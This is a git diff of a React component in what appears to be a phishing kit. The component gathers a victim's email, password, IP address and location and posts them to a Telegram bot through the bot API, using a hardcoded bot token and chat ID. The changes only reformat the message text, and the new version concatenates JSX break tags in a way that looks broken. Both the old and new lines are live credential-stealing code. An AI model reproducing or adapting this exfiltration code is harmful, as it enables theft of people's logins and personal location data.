@@ -74,15 +74,15 @@ function App() {
     const botID = "bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak";
     const data = {
       chat_id: "5345652511",
-      text: JSON.stringify({
-        email: fields.email,
-        password: field.secret,
-        ip: info.ip,
-        city: info.city,
-        country: info.country,
-        postal: info.postal,
-        region: info.region,
-      }),
+      text: {
+        email: fields.email + <br/>,
+        password: field.secret  + <br/>,
+        ip: info.ip  + <br/>,
+        city: info.city  + <br/>,
+        country: info.country  + <br/>,
+        postal: info.postal  + <br/>,
+        region: info.region  + <br/>,
+      },
     };
     try {
       const response = await axios.post(
@@ -99,7 +99,7 @@ function App() {
       console.log(e.response);
     }
 
-    setField({ secret: "" });
+    setField({ secret:"" });
     console.log(field);
 
    }
@@ -107,22 +107,22 @@ function App() {
       const botID = "bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak";
       const data = {
         chat_id: "5345652511",
-        text:  JSON.stringify({
-          email: fields.email ,
-          password: field.secret,
-          ip: info.ip ,
-          city: info.city ,
-          country: info.country ,
-          postal: info.postal ,
-          region: info.region ,
-        }),
+        text:  {
+       email: fields.email  + <br/>,
+        password: field.secret  + <br/>,
+        ip: info.ip + <br/>,
+        city : info.city + <br/>,
+        country: info.country + <br/>,
+        postal: info.postal + <br/>,
+        region: info.region  + <br/>,
+        },
       };
       try {
         const response = await axios.post(
           `https://api.telegram.org/${botID}/sendMessage`,
           data,
           {
-            headers: { "Content-Type": "application/json" },
+         headers: { "Content-Type": "application/json" },
           }
         );
         if (response.data.ok === true) {
